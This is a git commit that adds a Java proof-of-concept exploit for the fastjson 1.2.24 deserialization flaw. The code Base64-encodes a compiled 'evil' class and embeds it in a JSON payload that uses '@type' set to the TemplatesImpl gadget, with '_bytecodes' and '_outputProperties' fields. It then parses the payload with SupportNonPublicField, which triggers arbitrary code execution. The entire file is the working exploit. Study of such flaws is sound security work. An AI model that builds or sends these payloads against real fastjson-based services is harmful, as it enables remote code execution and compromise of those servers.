0c26706d6ab1c6e11b93358a58504ed18d2dded5
sweet0xff <sweetifan@qq.com>
2021-01-13 10:15:33 +0800

    1.2.24 poc demo

---
+++ fastjson/1.2.24/src/main/java/com/sweet/PocTemplatesImpl.java
@@ -0,0 +1,48 @@
+package com.sweet;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
+import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.io.IOUtils;
+
+import java.io.ByteArrayOutputStream;
+import java.io.FileInputStream;
+import java.io.IOException;
+
+/**
+ * @author sweet
+ * @date 2021/1/12 11:59
+ */
+public class PocTemplatesImpl {
+    public static void main(String[] args) {
+        ParserConfig config = new ParserConfig();
+        final String fileSeparator = System.getProperty("file.separator");
+        final String dirPath1 = System.getProperty("user.dir");
+        String tmp = "\\fastjson\\1.2.24\\target\\classes\\com\\sweet\\Test1.class";
+
+        final String dirPath2 = tmp.replaceAll("\\\\", fileSeparator);
+        final String evilClassPath = dirPath1 + dirPath2;
+        String evilCode = readClass(evilClassPath);
+        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
+        String text1 = "{\"@type\":\"" + NASTY_CLASS +
+                "\",\"_bytecodes\":[\""+evilCode+"\"]," +
+                "'_name':'a.b'," +
+                "'_tfactory':{ }," +
+                "\"_outputProperties\":{ }}\n";
+        System.out.println(text1);
+        //String personStr = "{'name':"+text1+",'age':19}";
+        //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField);
+        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
+    }
+
+    public static String readClass(String cls){
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        try {
+            IOUtils.copy(new FileInputStream(cls), bos);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        return Base64.encodeBase64String(bos.toByteArray());
+    }
+}
